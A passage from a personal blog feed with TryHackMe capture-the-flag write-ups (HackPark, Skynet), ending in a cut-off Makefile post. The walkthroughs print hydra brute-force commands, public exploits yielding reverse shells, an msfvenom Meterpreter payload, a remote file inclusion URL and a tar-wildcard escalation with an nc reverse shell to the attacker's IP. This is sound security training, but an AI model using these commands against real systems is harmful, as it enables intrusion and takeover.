<div id="outline-container-orgf5e6829" class="outline-2">
<h2 id="orgf5e6829"><span class="section-number-2">6.</span> <a href="#orgf5e6829">In conclusion</a></h2>
<div class="outline-text-2" id="text-6">
<p>
This might be one of the best rooms I have ever checked out and I am
glad I did.
</p>
</div>
</div>
<div id="outline-container-orga6e3376" class="outline-2">
<h2 id="orga6e3376"><span class="section-number-2">7.</span> <a href="#orga6e3376">Links:</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Although I usually keep myself from searching for walkthroughs and
solutions, this time, partly due to the insufficiency of the
instructions and partly due to my inability to see what went wrong in
my good-looking attempts to solve each task , I have checked some
articles covering that same room
</p>
<ul class="org-ul">
<li><a href="https://l1ge.github.io/tryhackme_bof1/">https://l1ge.github.io/tryhackme_bof1/</a>
<ul class="org-ul">
<li>I really liked the way of writing.</li>
</ul></li>
<li><a href="https://bobloblaw321.wixsite.com/website/post/tryhackme-buffer-overflows">https://bobloblaw321.wixsite.com/website/post/tryhackme-buffer-overflows</a> 
<ul class="org-ul">
<li>Nice explanation of step 7. It was the author&rsquo;s comment on the
proper way of entering input that made me realize my payload was
not wrong, but the way I delivered it was.</li>
</ul></li>
<li><a href="https://stackoverflow.com/questions/32345320/get-return-address-gdb">https://stackoverflow.com/questions/32345320/get-return-address-gdb</a>
<ul class="org-ul">
<li>The <code>info frame</code> command helped me better understand</li>
</ul></li>
</ul>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I am planning on publishing the resulting work here as soon as
I finish it. It was invigorating to see how my previous work,
structure and collection/organization allowed me to effectively tackle
the task of writing an academic paper. Maybe some notes on that are
due as well.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>THM Hackpark</title>
<link>posts/20231214_back_again_thm_hackpark.html</link>
<pubDate>Thu, 14 Dec 2023 23:58:00 +0200</pubDate>
<guid>posts/20231214_back_again_thm_hackpark.html</guid>
<description>
<![CDATA[<p>
After taking a short break from CTFs, trying to keep my <b>tryhackme</b>
active streak &#x2026; active and losing quite a lot of time to finding and
fixing stuff (unfortunately not only in software), it is time for yet
another CTF. If I am not mistaken this is listed as an easy one, so
let&rsquo;s dive right in.
</p>

<p>
After using the good ol trick of modifying <code>/etc/hosts</code> and <code>.bashrc</code> for
easier handling of the remote machine&rsquo;s address:
</p>
<div id="outline-container-org57d66be" class="outline-2">
<h2 id="org57d66be"><span class="section-number-2">1.</span> <a href="#org57d66be">Recon</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Our initial port scan only shows 2 open ports:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> 80: a web server</li>
<li class="off"><code>[&#xa0;]</code> 3389: Microsoft SChannel TLS (which the most prominent google
results suggest may be an RDP entry point)</li>
</ul>
<div class="org-src-container">
<pre class="src src-bash" id="orgbf3d650">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
After checking on the results that the full nmap scan returned (while
the bruteforce performed ahead was running), another open port was
revealed:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> 5985: wsman</li>
</ul>
</div>
<div id="outline-container-orga843c68" class="outline-3">
<h3 id="orga843c68"><span class="section-number-3">1.1.</span> <a href="#orga843c68">Visiting the WebServer</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
The website is powered by <code>BlogEngine</code>, with numerous exploits readily
available for certain versions of it in exploitdb.
</p>

<p>
<code>robots.txt</code> has some nice directories:
</p>
<pre class="example" id="org8c31ccc">
User-agent: *
Disallow: /Account/*.*
Disallow: /search
Disallow: /search.aspx
Disallow: /error404.aspx
Disallow: /archive
Disallow: /archive.aspx
</pre>

<p>
We have a contact form, so a XSS vulnerability could (maybe) be used
</p>

<div id="org44a7cc5" class="figure">
<p><img src="posts/images/Recon/20231215_000936_screenshot.png" alt="20231215_000936_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Contact form</p>
</div>

<p>
We also have a log in form:
</p>

<div id="orgb96b652" class="figure">
<p><img src="posts/images/Recon/20231215_001129_screenshot.png" alt="20231215_001129_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Log in form</p>
</div>

<p>
The room&rsquo;s author (after dealing with the first &ldquo;flag&rdquo;), suggests
bruteforcing, so even though it is not my first option, this is what I
am looking at.
</p>
</div>
</div>
</div>
<div id="outline-container-orgaedeeb3" class="outline-2">
<h2 id="orgaedeeb3"><span class="section-number-2">2.</span> <a href="#orgaedeeb3">Bruteforcing the website log in</a></h2>
<div class="outline-text-2" id="text-2">
<p>
After redirecting my web traffic to burp, so that I can better see how
my post requests are structured, it becomes apparrent that there is a
set of parameters (other than just username and password) I need to
set:
</p>

<pre class="example" id="org7dad6e0">
__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
</pre>

<p>
Adding to these the knowledge that the login post request had this
path <code>/Account/login.aspx</code> and failed login attempts had <code>Login failed</code>:,
I structured the following hydra command:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org7e5ad48">hydra -l admin -P /usr/share/wordlists/rockyou.txt hackpark.thm http-post-form <span class="org-string">"/Account/login.aspx:__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span> 
</pre>
</div>

<p>
After waiting for some time, it gave us the password.
</p>
</div>
</div>
<div id="outline-container-org6c8337d" class="outline-2">
<h2 id="org6c8337d"><span class="section-number-2">3.</span> <a href="#org6c8337d">Exploiting BlogEngine</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Seeing that BlogEngine had some exploits available, I immediately
searched for the currently running version, (available in the <code>about</code>
pane). 
</p>


<div id="org4586c2a" class="figure">
<p><img src="posts/images/Exploiting_BlogEngine/20231215_003106_screenshot.png" alt="20231215_003106_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>Blog Engine Version</p>
</div>

<p>
Heading back to <code>searchsploit</code>, we see that there are two readily
available python scripts for us to use (much better than the manual
alternative :P ):
</p>

<pre class="example" id="org1a26f13">
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Direct | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' D | aspx/webapps/47011.py
</pre>

<p>
Now, after checking with (-x), we see that both of them are by the
same author and essentially have a similar behavior. I decided to go
with the first one.
</p>

<pre class="example" id="org2f0d79d">
Exploit for CVE-2019-10719

CVE Identified by: Aaron Bishop
Exploit written by: Aaron Bishop

Upload and trigger a reverse shell

python exploit.py -t 192.168.10.9 -l 192.168.10.10:1337

Open a listener to capture the reverse shell - Metasploit or netcat

nc -nlvp 1337
</pre>

<p>
This, taken from the exploit file (obviously), served as the basis for
the following command
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org2b2073f">searchsploit -m 47010 <span class="org-comment-delimiter"># </span><span class="org-comment">this might be just the most beautiful option in searchsploit, which I had *totally* missed for quite a long time</span>
python 47010.py -t hackpark.thm -l 10.10.93.209:6969 -u admin -p 1qaz2wsx
</pre>
</div>

<p>
This, strangely did not work, so before tinkering around any longer, I
ran the same command with 47011 (which required me to comment out just
one line in the python script as well). At this point, 47011 gave us a
nice reverse shell.
</p>



<div id="org02237b5" class="figure">
<p><img src="posts/images/Exploiting_BlogEngine/20231215_004446_screenshot.png" alt="20231215_004446_screenshot.png">
</p>
<p><span class="figure-number">Figure 4: </span>Initial Foothold</p>
</div>

<p>
Seeing the privileges granted to our user, even the privilege
escalation path is already known, so after uploading winpeas or
getting a meterpreter shell, there is no need for manual priv esc.
</p>
</div>
</div>
<div id="outline-container-orgc96e8bb" class="outline-2">
<h2 id="orgc96e8bb"><span class="section-number-2">4.</span> <a href="#orgc96e8bb">PrivEsc</a></h2>
<div class="outline-text-2" id="text-4">
<p>
This section could be called &ldquo;getting the flags&rdquo;, because I do not
believe that I would go 
</p>
</div>
<div id="outline-container-org579cc81" class="outline-3">
<h3 id="org579cc81"><span class="section-number-3">4.1.</span> <a href="#org579cc81">Meterpreter</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
First things first, generating and uploading the payload to the target
host:
</p>
<pre class="example" id="org7a52157">
root@ip-10-10-93-209:~# msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.93.209 LPORT=6970
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
root@ip-10-10-93-209:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</pre>

<p>
Now, getting the file to the target system was <b>way</b> harder than it
needed to be. Initially, I thought that it would be just a bit more
difficult than it is on Linux. No matter what I tried, however, I
could not see that long awaited line in my python server, showing that
the file had been requested&#x2026;
</p>

<p>
Sometime, I managed to get it to do the request, but a &rsquo;Bad Request
Syntax&rsquo; prevented me from getting too excited - if you find yourself
in that position make sure that you are smarter than me: pressing
https instead of http by habit.
</p>

<pre class="example" id="org36c2070">
powershell -c "Invoke-WebRequest -Uri 'http://10.10.93.209:8000/shell.exe' -OutFile 'c:\Windows\Temp\shell.exe'"
</pre>


<div id="org2dad4a9" class="figure">
<p><img src="posts/images/PrivEsc/20231215_012431_screenshot.png" alt="20231215_012431_screenshot.png">
</p>
<p><span class="figure-number">Figure 5: </span>Meterpreter</p>
</div>


<p>
(After completing this section I realized I did not include how the
handler was set up, but it is trivial, just <code>use</code> the
exploit/multi/handle - shown above - and complete the options)
</p>

<p>
After completing the tedious flags, just a simple <code>cat</code> gives us the
flag on <code>jeff</code>&rsquo;s and <code>Administrator</code>&rsquo;s desktops respectively.
</p>

<p>
Winpeas is not necessary since we have a full-fledged meterpreter
session. Maybe next time.
</p>
</div>
</div>
</div>
<div id="outline-container-orge4df3c6" class="outline-2">
<h2 id="orge4df3c6"><span class="section-number-2">5.</span> <a href="#orge4df3c6">Conclusion</a></h2>
<div class="outline-text-2" id="text-5">
<p>
I will focus on getting some more experience with windows, at least on
a theoretical level, and populating my notes better, because I think
it is quite sad to see how much more difficult exploiting windows feels.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>THM: Skynet</title>
<link>posts/20231215_sigh_hasta_la_vista_thm_skynet.html</link>
<pubDate>Fri, 15 Dec 2023 11:32:00 +0200</pubDate>
<guid>posts/20231215_sigh_hasta_la_vista_thm_skynet.html</guid>
<description>
<![CDATA[<p>
Yesterday I lost the opportunity to use &ldquo;I&rsquo;ll be back&rdquo; on my post&rsquo;s
title. Unfortunate but I had not seen <code>Skynet</code> in the list of my TODO
rooms.
</p>
<div id="outline-container-orge15878b" class="outline-2">
<h2 id="orge15878b"><span class="section-number-2">1.</span> <a href="#orge15878b">Reconnaissance</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Start by updating <code>/etc/hosts</code> and <code>.bashrc</code>, to save yourself some time.
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org1aff152"><span class="org-builtin">echo</span> <span class="org-string">"10.10.201.239  skynet.thm"</span> &gt;&gt; /etc/hosts
<span class="org-builtin">echo</span> <span class="org-string">"IP=skynet.thm"</span> &gt;&gt; ~/.bashrc
</pre>
</div>
</div>
<div id="outline-container-orgfe9a01f" class="outline-3">
<h3 id="orgfe9a01f"><span class="section-number-3">1.1.</span> <a href="#orgfe9a01f">Port Scanning</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
The usual CTF-oriented nmap quick scan revealed quite a lot of open
ports in the target machine:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> 22: SSH</li>
<li class="off"><code>[&#xa0;]</code> 80: HTTP webserver</li>
<li class="off"><code>[&#xa0;]</code> 110: pop3: Dovecot pop3d
<ul class="org-ul">
<li>POP3 mail server</li>
</ul></li>
<li class="off"><code>[&#xa0;]</code> 139: Samba (3.X-4.X)</li>
<li class="off"><code>[&#xa0;]</code> 143: imap: Dovecot imapd</li>
<li class="off"><code>[&#xa0;]</code> 445: Samba 4.3.11</li>
</ul>

<p>
I started the full scan, just to be thorough enough, but we had enough
data to get going
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgad1ebe7">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgecf91f1" class="outline-3">
<h3 id="orgecf91f1"><span class="section-number-3">1.2.</span> <a href="#orgecf91f1">Understanding target ports</a></h3>
</div>
<div id="outline-container-org1086ec6" class="outline-3">
<h3 id="org1086ec6"><span class="section-number-3">1.3.</span> <a href="#org1086ec6">Website</a></h3>
<div class="outline-text-3" id="text-1-3">
<p>
The webserver strangely looks like a search engine, and it does not
produce any results to the random strings I tried.  
</p>


<div id="org0bbefa1" class="figure">
<p><img src="posts/images/Reconnaissance/20231215_114140_screenshot.png" alt="20231215_114140_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Homepage</p>
</div>
</div>
<div id="outline-container-orgada2d20" class="outline-4">
<h4 id="orgada2d20"><span class="section-number-4">1.3.1.</span> <a href="#orgada2d20">Directory Enumeration with gobuster</a></h4>
<div class="outline-text-4" id="text-1-3-1">
<p>
Seeing that I was unable to get any promising information manually, I
did not lose any more time, before launching gobuster:
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org38be06d">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
</pre>
</div>

<p>
That, in turn, gave us some directories to check:
</p>
<pre class="example" id="org761c8aa">
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/ai (Status: 301)
/config (Status: 301)
/css (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
/squirrelmail (Status: 301)
</pre>

<p>
While most of these show up as forbidden, <b>squirrelmail</b> is promising:
</p>


<div id="org00e3728" class="figure">
<p><img src="posts/images/Reconnaissance/20231215_114714_screenshot.png" alt="20231215_114714_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>SquirrelMail Login page</p>
</div>


<p>
Sadly <b>searchsploit</b> did not reveal any usable exploits for that version
(had it been for 1.4.22, we would have a perfectly fine RCE&#x2026;shame)
</p>
</div>
</div>
</div>
<div id="outline-container-org77fb56c" class="outline-3">
<h3 id="org77fb56c"><span class="section-number-3">1.4.</span> <a href="#org77fb56c">Samba enumeration</a></h3>
<div class="outline-text-3" id="text-1-4">
<p>
Just from what we have already seen, we do not have any credentials or
information about the users of this machine. Putting web analysis and
enumeration on hold for Samba might be the right move to make:
</p>


<div id="orgdcf22b8" class="figure">
<p><img src="posts/images/Reconnaissance/20231216_125505_screenshot.png" alt="20231216_125505_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>Nmap samba info</p>
</div>

<p>
I&rsquo;m thinking of using <code>smbclient</code> and if that does not get us anywhere
<code>enum4linux</code> to get some more information about the shares available
</p>

<p>
Smbclient does a pretty decent job:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org8168c4e">smbclient -L $<span class="org-variable-name">IP</span> -U guest
</pre>
</div>


<div id="orgeb080ca" class="figure">
<p><img src="posts/images/Reconnaissance/20231216_125934_screenshot.png" alt="20231216_125934_screenshot.png">
</p>
<p><span class="figure-number">Figure 4: </span>Shares on target samba</p>
</div>

<p>
Now it would be interesting to connect to any of those shares (except
for print actually):
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> anonymous might be the only one not password protected</li>
<li class="off"><code>[&#xa0;]</code> milesdyson might gives us some more information about the user</li>
<li class="off"><code>[&#xa0;]</code> IPC might have some interesting files for us (perhaps a path to
gain initial foothold or privilege escalation later on)</li>
</ul>
</div>
<ol class="org-ol">
<li><a id="org25e8131"></a><a href="#org25e8131">Anonymous</a><br>
<div class="outline-text-5" id="text-1-4-0-1">
<div class="org-src-container">
<pre class="src src-bash" id="org1631b9b">smbclient //$<span class="org-variable-name">IP</span>/anonymous -U guest
</pre>
</div>

<p>
Not much here:
</p>
<ul class="org-ul">
<li>An <code>attention.txt</code> file, simply pointing at a <i>recent system
malfunction</i>.</li>
<li>A log subdirectory containing:
<ul class="org-ul">
<li><code>log1.txt</code>: Looks like a wordlist - maybe checking it with hydra
against the login prompt (or the samba share / ssh server maybe) with
<code>milesdyson</code> (?)</li>
<li><code>log{2,3}.txt</code>: empty files</li>
</ul></li>
</ul>
</div>
</li>
<li><a id="org6c954f2"></a><a href="#org6c954f2">Milesdyson</a><br>
<div class="outline-text-5" id="text-1-4-0-2">
<div class="org-src-container">
<pre class="src src-bash" id="orgbfd3b2f">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U guest
</pre>
</div>

<p>
Access denied - can&rsquo;t login here as <code>milesdyson</code>.
</p>
</div>
</li>
</ol>
</div>
<div id="outline-container-orgcf34292" class="outline-3">
<h3 id="orgcf34292"><span class="section-number-3">1.5.</span> <a href="#orgcf34292">Testing the wordlist</a></h3>
<div class="outline-text-3" id="text-1-5">
<ul class="org-ul">
<li>The given wordlist proved useless for ssh login</li>
<li>Testing the wordlist on the mail entrypoint was a good choice : we
got miles password</li>
</ul>

<div class="org-src-container">
<pre class="src src-bash" id="org83f16f6">hydra -l milesdyson -P log1.txt $<span class="org-variable-name">IP</span> http-post-form <span class="org-string">"/squirrelmail/src/redirect.php: login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:incorrect"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org9849cb5" class="outline-3">
<h3 id="org9849cb5"><span class="section-number-3">1.6.</span> <a href="#org9849cb5">Checking the mail</a></h3>
<div class="outline-text-3" id="text-1-6">
<p>
Using the newly found password, we can try to see if there is any
useful information in the user&rsquo;s email account:
</p>
</div>
<div id="outline-container-orgf68b461" class="outline-4">
<h4 id="orgf68b461"><span class="section-number-4">1.6.1.</span> <a href="#orgf68b461">Password rEsEt</a></h4>
<div class="outline-text-4" id="text-1-6-1">

<div id="org3f2d293" class="figure">
<p><img src="posts/images/Reconnaissance/20231216_131629_screenshot.png" alt="20231216_131629_screenshot.png">
</p>
<p><span class="figure-number">Figure 5: </span>Lo and Behold</p>
</div>
</div>
</div>
<div id="outline-container-org4a0b894" class="outline-4">
<h4 id="org4a0b894"><span class="section-number-4">1.6.2.</span> <a href="#org4a0b894">Yeah don&rsquo;t know about that</a></h4>
<div class="outline-text-4" id="text-1-6-2">
<p>
In another mail, we get this binary sequence, which given its
structure suggests the usage of a binary to ASCII converter: The final
text makes <b>absolutely</b> no sense:
</p>

<pre class="example" id="org7fc8a12">
balls have zero to me to me to me to me to me to me to me to me to
</pre>


<div id="org37b9689" class="figure">
<p><img src="posts/images/Reconnaissance/20231216_131754_screenshot.png" alt="20231216_131754_screenshot.png">
</p>
</div>

<p>
After viewing the last email, the &ldquo;hexdump&rdquo; from above seems to be a
line from a song (?) - Nah. Searching for it online it <b>interestingly</b>
points to an incident in Facebook Artificial Intelligence lab: <a href="https://languagelog.ldc.upenn.edu/nll/?p=33355">see
here</a>
</p>
</div>
</div>
</div>
<div id="outline-container-org2487e2f" class="outline-3">
<h3 id="org2487e2f"><span class="section-number-3">1.7.</span> <a href="#org2487e2f">Going back to the samba shares</a></h3>
<div class="outline-text-3" id="text-1-7">
<div class="org-src-container">
<pre class="src src-bash" id="orgcd1540e">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U milesdyson
</pre>
</div>

<p>
In this share there are some machine/deep learning related pdfs, a
wide set of markdown notes on these topics (might be worth checking
out :P), and a file titled <code>important.txt</code>. <b>Sigh</b> I mEaN wHeRe sHoUlD I
gO nOw?
</p>


<div id="org52fc8ec" class="figure">
<p><img src="posts/images/Reconnaissance/20231216_132530_screenshot.png" alt="20231216_132530_screenshot.png">
</p>
<p><span class="figure-number">Figure 6: </span>Important.txt</p>
</div>
</div>
</div>
<div id="outline-container-orgeef6341" class="outline-3">
<h3 id="orgeef6341"><span class="section-number-3">1.8.</span> <a href="#orgeef6341">Checking the CMS</a></h3>
<div class="outline-text-3" id="text-1-8">
<p>
There seems to be a personal webpage at the new link we found out
about. Again, enumeration is due:
</p>
<ul class="org-ul">
<li><code>/administrator</code> gets found by gobuster</li>
</ul>

<div class="org-src-container">
<pre class="src src-bash" id="org4473fe8">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span>/45kra24zxs28v3yd -o gobuster.big
</pre>
</div>

<p>
Visiting <code>/administrator</code> we get to a login page of <b>CuppaCMS</b>:
</p>


<div id="orgb6e2f4f" class="figure">
<p><img src="posts/images/Reconnaissance/20231216_132854_screenshot.png" alt="20231216_132854_screenshot.png">
</p>
<p><span class="figure-number">Figure 7: </span>Login page of Cuppa</p>
</div>

<p>
My first thought was to check the password we had found for the email,
however, my lazy me thought: <i>Too manual</i>, check for exploits first.
Apparently there is a readily available exploit in exploit-db: 25971.
</p>
</div>
</div>
</div>
<div id="outline-container-orgf5ead12" class="outline-2">
<h2 id="orgf5ead12"><span class="section-number-2">2.</span> <a href="#orgf5ead12">Exploitation</a></h2>
<div class="outline-text-2" id="text-2">
</div>
<div id="outline-container-org1f7a03d" class="outline-3">
<h3 id="org1f7a03d"><span class="section-number-3">2.1.</span> <a href="#org1f7a03d">CuppaCMS</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Using the following payload, as described in the exploit we found, we
see that there is:
</p>
<ol class="org-ol">
<li>LFI potential (we could maybe get a flag through that (?))</li>
<li>RFI potential (PHP injection) (a reverse shell might be nice as well)</li>
</ol>

<pre class="example" id="org2b26b0b">
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
</pre>
</div>
<div id="outline-container-org3d0bfa6" class="outline-4">
<h4 id="org3d0bfa6"><span class="section-number-4">2.1.1.</span> <a href="#org3d0bfa6">Generating a php reverse shell and hosting it</a></h4>
<div class="outline-text-4" id="text-2-1-1">
<p>
I always like using <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">this</a> as my go-to php shell so there was not much
to do:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgcbad502">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
vim php-reverse-shell.php
python3 -m http.server
nc -lvnp 6969 <span class="org-comment-delimiter"># </span><span class="org-comment">do not forget the listener</span>
</pre>
</div>

<p>
Then, manipulating the <code>urlConfig</code> parameter once again we forge a
request:
</p>
<pre class="example" id="org4475062">
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.95.44:8000/php-reverse-shell.php
</pre>

<p>
This successfully gives us an entrypoint!
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org2214785" class="outline-2">
<h2 id="org2214785"><span class="section-number-2">3.</span> <a href="#org2214785">Privilege Escalation - Lateral Movement</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Before doing anything else, make the shell more usable:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org79e3e12">python3 -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
</pre>
</div>
</div>
<div id="outline-container-org08e14aa" class="outline-3">
<h3 id="org08e14aa"><span class="section-number-3">3.1.</span> <a href="#org08e14aa">www-data</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
We can move to miles home directory and get the user flag, but there
are some more interesting files there as well:
</p>
<ul class="org-ul">
<li>share: the samba share that we have already checked</li>
<li>backups.sh: i&rsquo;m thinking that this will be the way to get access as
another user: a crontab must be running and while the file itself is
not readily exploitable by us (not writeable), we can manipulate its
options</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org9c30390" class="outline-2">
<h2 id="org9c30390"><span class="section-number-2">4.</span> <a href="#org9c30390">Getting Root: Tar wildcards</a></h2>
<div class="outline-text-2" id="text-4">
<p>
I have seen this exploit before so I know that by creating the right
set of files, this line can result to either the creation of a SUID
shell file for us, or to another reverse shell. For the shake of
simplicity, I will go the second route.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

<pre class="example" id="orge24ba56">
tar cf /home/milesdyson/backups/backup.tgz *
</pre>

<p>
Initially I had opted for a different route but, for some reason I
could not create the checkpoint action file. Creating a <i>payload</i> file
with the command, I changed my approach to the following: 
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org0479ee7"><span class="org-builtin">echo</span> <span class="org-string">''</span>&gt;  <span class="org-string">'--checkpoint=1'</span>
<span class="org-builtin">echo</span> <span class="org-string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.95.44 6970 &gt;/tmp/f'</span> &gt; shell.sh
<span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; <span class="org-string">"--checkpoint-action=exec=bash shell.sh"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org1d5bb55" class="outline-2">
<h2 id="org1d5bb55"><span class="section-number-2">5.</span> <a href="#org1d5bb55">Conclusion</a></h2>
<div class="outline-text-2" id="text-5">
<div class="tenor-gif-embed" data-postid="20118743" data-share-method="host" data-aspect-ratio="1.56863" data-width="100%"><a href="https://tenor.com/view/exterminador-do-futuro-gif-20118743">Exterminador Futuro GIF</a>from <a href="https://tenor.com/search/exterminador-gifs">Exterminador GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
In fact: source: <a href="https://www.sevenlayers.com/index.php/353-exploiting-tar-wildcards">https://www.sevenlayers.com/index.php/353-exploiting-tar-wildcards</a>
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Make-ing my life easier</title>
<link>posts/20231227_making_my_life_easier.html</link>
<pubDate>Wed, 27 Dec 2023 12:25:00 +0200</pubDate>
<guid>posts/20231227_making_my_life_easier.html</guid>
<description>
<![CDATA[<div id="outline-container-orga6e5f9e" class="outline-2">
<h2 id="orga6e5f9e"><span class="section-number-2">1.</span> <a href="#orga6e5f9e">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
At the time of writing, my blog directory is certainly cluttered, and I  
<b>really</b> don&rsquo;t want that. It prevents me from easily checking my website (I&rsquo;m  
not sure if the clutter caused my occasional lack of proper documentation or  
if it&rsquo;s the other way around), but this has to change. Here, I plan to briefly  
document the next 10 minutes for myself so that it all makes sense.  
</p>
</div>
</div>
<div id="outline-container-org0d2d266" class="outline-2">
<h2 id="org0d2d266"><span class="section-number-2">2.</span> <a href="#org0d2d266">Goal</a></h2>
<div class="outline-text-2" id="text-2">
<p>
My objective here is to quickly create a Makefile with a <code>local</code> set of  
instructions that will:  
</p>
<ol class="org-ol">
<li>Create a <code>public</code> directory and populate it.</li>
<li>Launch a Python server.</li>
</ol>
</div>
</div>
<div id="outline-container-orga6bfc94" class="outline-2">
<h2 id="orga6bfc94"><span class="section-number-2">3.</span> <a href="#orga6bfc94">Execution</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Using the <code>local-build.sh</code> script, I knew this wouldn&rsquo;t take long. Since it&rsquo;s  
an open-source file and I&rsquo;m not particularly concerned about the  
confidentiality of its contents, I uploaded it to ChatGPT, asking for it to be  
refactored and documented into a Makefile:  
</p>

<pre class="example" id="orgb49b11a">
# Makefile for building and publishing a site  
# Directories  
PUBLIC_DIR := public  
POSTS_DIR := $(PUBLIC_DIR)/posts  

# Targets  
.DEFAULT_GOAL := local  

# Remove local directory  
clean:  
	@if [ -d $(PUBLIC_DIR) ]; then \  
